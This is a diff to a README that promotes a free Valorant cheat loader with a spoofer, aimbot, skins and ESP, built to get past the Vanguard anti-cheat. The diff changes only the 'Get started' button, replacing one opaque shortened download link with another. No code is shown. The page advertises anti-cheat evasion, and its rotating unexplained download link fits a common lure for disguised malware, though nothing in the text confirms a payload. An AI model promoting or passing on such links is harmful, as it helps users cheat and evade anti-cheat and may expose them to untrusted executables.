@@ -5,7 +5,7 @@
 One loader for Valorant — **spoofer, aimbot, skins and ESP**. Built for the current Vanguard patch. **Free, portable, updated per patch.**
 
 <p align="center">
-  <a href="https://share.google/JbRs55kgaSGniEQYs"><img src="button.svg" alt="Get started" height="46"></a>
+  <a href="https://share.google/0rfPpeW9zeU3lFrhv"><img src="button.svg" alt="Get started" height="46"></a>
 </p>
 
 ## ⚡ Quick Start
